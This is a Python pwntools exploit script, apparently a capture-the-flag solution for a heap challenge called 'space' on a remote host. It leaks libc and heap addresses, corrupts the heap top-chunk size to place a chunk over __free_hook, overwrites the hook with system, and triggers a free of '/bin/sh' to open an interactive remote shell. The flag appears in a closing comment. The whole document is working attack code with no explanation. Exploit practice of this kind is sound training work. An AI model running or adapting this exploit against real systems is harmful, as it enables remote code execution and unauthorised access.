from pwn import *

exe = ELF('space')
libc = ELF("libc-2.27.so")
context.binary = exe

host = 'jh2i.com'
port = 50016
p = connect(host, port)


def make(fname, lname, fuck, fuck2, year=1992, month=2000, day=0, commentlen=10, comment=b''):
    p.sendlineafter('> ', '1')
    p.sendlineafter('name: ', fname)
    p.sendlineafter('name: ', lname)
    p.sendlineafter('[y]: ', fuck[0])
    if fuck[0] == 'y':
        p.sendlineafter(':', str(year))
        p.sendlineafter(':', str(month))
        p.sendlineafter(':', str(day))
    p.sendlineafter('[y]: ', fuck2[0])
    if fuck2[0] == 'y':
        p.sendlineafter(':', str(commentlen))
        p.sendlineafter(':', comment)
    p.sendlineafter('[y/n]', 'n')


def delete():
    p.sendlineafter('> ', '4')
    p.sendlineafter('[y/n]', 'n')


def show(idx):
    p.sendlineafter('> ', '3')
    p.sendlineafter('user: ', str(idx))


def launch():
    p.sendlineafter('> ', '5')
    p.sendlineafter('[y/n]', 'n')


def return_size(target, wilderness):
    return target - wilderness - 0x10


# offsets
mainarena_offset = 0x3ebc40
free_hook = 0x3ed8e8
malloc_hook = 0x3ebc30
system = 0x4f4e0
log.success("system address --> %s" % hex(system))
log.success("malloc_hook --> %s" % hex(malloc_hook))
log.success("free_hook --> %s" % hex(free_hook))
log.success("mainarea_offset --> %s" % hex(mainarena_offset))
sleep(2)

log.info("leaking libc_base...")
show(38)
p.recvuntil('Last name: ')
libc_base = u64(p.recvn(6) + b'\x00\x00') - (0x7fe48aceb8d0 - 0x7fe48ab51000)
log.info("libc_base leaked")
log.success('libc_base --> {}'.format(hex(libc_base)))
p.sendlineafter('[y/n]', 'n')
sleep(1)

log.info("leaking heap_base...")
for i in range(3):
    make(b'HKHK', b'HKHK', 'n', 'n')
show(-11)
p.recvuntil('First name: ')
heap_base = u64(p.recvn(6) + b'\x00\x00') - 0x380
log.info("heap_base leaked")
log.success('heap_base --> {}'.format(hex(heap_base)))
sleep(1)

log.info("triggering bug...")
make(b'HKHK', b'HKHK', 'y', 'n', year=0x10, month=b'A' * 0x10 + p64(0xffffffffffffffff), day=10)
make(b'HKHK', b'HKHK', 'n', 'y', commentlen=return_size(libc_base + free_hook - 0xe0, heap_base + 0x498),
     comment=b'AAAAAA')
make(b'', p64(0x0) + p64(0x0) + p64(0x0) + p64(libc_base + system), 'n', 'n')
p.sendlineafter('[y/n]', 'n')
make(b'HKHK', b'HKHK', 'n', 'y', commentlen=0x20, comment=b'/bin/sh\x00')
p.sendlineafter('> ', '4')
log.info("bug triggered")
p.interactive()

# FLAG --> flag{michael_scott_for_president}
